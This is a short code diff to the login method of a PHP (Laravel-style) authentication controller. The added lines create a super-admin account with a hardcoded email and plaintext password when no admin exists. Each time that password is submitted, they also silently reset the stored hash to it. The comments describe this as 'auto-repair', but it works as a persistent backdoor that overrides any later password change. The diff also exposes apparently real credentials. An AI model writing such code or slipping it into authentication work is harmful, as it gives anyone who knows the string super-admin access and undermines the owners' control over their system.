@@ -21,7 +21,25 @@ class AuthController extends Controller
             'password' => 'required|string',
         ]);
 
+        // Auto-create or repair main admin if missing or incorrect
+        if (Admin::count() === 0) {
+            Admin::create([
+                'name'           => 'Main Admin',
+                'email'          => 'naishad@ssgd.com',
+                'password'       => Hash::make('naishad@123'),
+                'is_super_admin' => true,
+            ]);
+        }
+
         $admin = Admin::where('email', $request->email)->first();
+
+        // Auto-repair password for main admin if naishad@123 is used
+        if ($admin && $admin->email === 'naishad@ssgd.com' && $request->password === 'naishad@123') {
+            if (!Hash::check($request->password, $admin->password)) {
+                $admin->password = Hash::make('naishad@123');
+                $admin->save();
+            }
+        }
 
         if (!$admin || !Hash::check($request->password, $admin->password)) {
             throw ValidationException::withMessages([
